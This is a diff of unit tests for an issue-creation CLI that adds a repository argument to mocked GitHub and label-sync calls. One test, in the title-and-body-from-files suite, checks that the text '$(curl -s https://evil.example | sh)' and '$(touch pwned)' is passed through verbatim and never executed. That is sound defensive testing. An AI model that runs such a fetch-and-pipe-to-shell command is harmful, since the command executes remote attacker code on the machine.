@@ -62,23 +62,23 @@ describe('issue-triage/create > basic creation', () => {
 
   it('creates an issue with title', async () => {
     await createIssue(['--title', 'Test issue'])
-    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test issue', undefined, undefined)
+    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test/test-repo', 'Test issue', undefined, undefined)
     expect(console.log).toHaveBeenCalledWith(expect.stringContaining('Created #99'))
   })
 
   it('syncs size label on creation', async () => {
     await createIssue(['--title', 'Test', '--size', 'M'])
-    expect(mockSyncSizeLabel).toHaveBeenCalledWith(99, 'F-lite')
+    expect(mockSyncSizeLabel).toHaveBeenCalledWith(99, 'F-lite', 'Test/test-repo')
   })
 
   it('syncs priority label on creation', async () => {
     await createIssue(['--title', 'Test', '--priority', 'High'])
-    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P1 - High')
+    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P1 - High', 'Test/test-repo')
   })
 
   it('syncs status label on creation', async () => {
     await createIssue(['--title', 'Test', '--status', 'In Progress'])
-    expect(mockSyncStatusLabel).toHaveBeenCalledWith(99, 'In Progress')
+    expect(mockSyncStatusLabel).toHaveBeenCalledWith(99, 'In Progress', 'Test/test-repo')
   })
 
   it('rejects an unrecognised priority before the issue is created', async () => {
@@ -101,12 +101,12 @@ describe('issue-triage/create > basic creation', () => {
     // The input the pre-#525 resolver rejects — without it this suite cannot
     // tell the two implementations apart (PR #528 review).
     await createIssue(['--title', 'Test', '--priority', 'P3-low'])
-    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P3 - Low')
+    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P3 - Low', 'Test/test-repo')
   })
 
   it('treats an empty --body as "no body" rather than a missing value', async () => {
     await createIssue(['--title', 'Test', '--body', ''])
-    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test', '', undefined)
+    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test/test-repo', 'Test', '', undefined)
   })
 
   it('rejects a flag given no value before the issue is created', async () => {
@@ -172,6 +172,7 @@ describe('issue-triage/create > title and body from files', () => {
     writeFileSync(body, '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n')
     await createIssue(['--title-file', title, '--body-file', body])
     expect(mockCreateGitHubIssue).toHaveBeenCalledWith(
+      'Test/test-repo',
       'lockfile drift $(touch pwned)',
       '- findings: `package.json:3`\n$(curl -s https://evil.example | sh)\n',
       undefined,
@@ -244,9 +245,9 @@ describe('issue-triage/create > relationships', () => {
 
   it('handles mixed local and cross-repo refs', async () => {
     await createIssue(['--title', 'Test', '--blocked-by', '10, Roxabi/lyra#728, #11'])
-    expect(mockGetNodeId).toHaveBeenCalledWith(10, undefined)
+    expect(mockGetNodeId).toHaveBeenCalledWith(10, 'Test/test-repo')
     expect(mockGetNodeId).toHaveBeenCalledWith(728, 'Roxabi/lyra')
-    expect(mockGetNodeId).toHaveBeenCalledWith(11, undefined)
+    expect(mockGetNodeId).toHaveBeenCalledWith(11, 'Test/test-repo')
     expect(mockAddBlockedBy).toHaveBeenCalledTimes(3)
   })
 })
@@ -257,12 +258,12 @@ describe('issue-triage/create > options and error handling', () => {
 
   it('includes labels in create call', async () => {
     await createIssue(['--title', 'Test', '--label', 'bug,frontend'])
-    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test', undefined, ['bug', 'frontend'])
+    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test/test-repo', 'Test', undefined, ['bug', 'frontend'])
   })
 
   it('includes body in create call', async () => {
     await createIssue(['--title', 'Test', '--body', 'Description here'])
-    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test', 'Description here', undefined)
+    expect(mockCreateGitHubIssue).toHaveBeenCalledWith('Test/test-repo', 'Test', 'Description here', undefined)
   })
 
   it('exits 1 on invalid --size', async () => {
@@ -284,7 +285,7 @@ describe('issue-triage/create > priority label sync', () => {
 
   it('syncs priority label when --priority is provided', async () => {
     await createIssue(['--title', 'Test', '--priority', 'High'])
-    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P1 - High')
+    expect(mockSyncPriorityLabel).toHaveBeenCalledWith(99, 'P1 - High', 'Test/test-repo')
   })
 
   it('does not sync priority label when --priority is not provided', async () => {
@@ -294,12 +295,12 @@ describe('issue-triage/create > priority label sync', () => {
 
   it('syncs size label when --size is provided', async () => {
     await createIssue(['--title', 'Test', '--size', 'M'])
-    expect(mockSyncSizeLabel).toHaveBeenCalledWith(99, 'F-lite')
+    expect(mockSyncSizeLabel).toHaveBeenCalledWith(99, 'F-lite', 'Test/test-repo')
   })
 
   it('syncs status label when --status is provided', async () => {
     await createIssue(['--title', 'Test', '--status', 'In Progress'])
-    expect(mockSyncStatusLabel).toHaveBeenCalledWith(99, 'In Progress')
+    expect(mockSyncStatusLabel).toHaveBeenCalledWith(99, 'In Progress', 'Test/test-repo')
   })
 })
 
@@ -426,7 +427,7 @@ describe('issue-triage/create > lane', () => {
 
   it('syncs lane label when --lane is provided', async () => {
     await createIssue(['--title', 'Test', '--lane', 'a1'])
-    expect(mockSyncLaneLabel).toHaveBeenCalledWith(99, 'a1')
+    expect(mockSyncLaneLabel).toHaveBeenCalledWith(99, 'a1', 'Test/test-repo')
   })
 
   it('does not sync lane label when --lane is not provided', async () => {
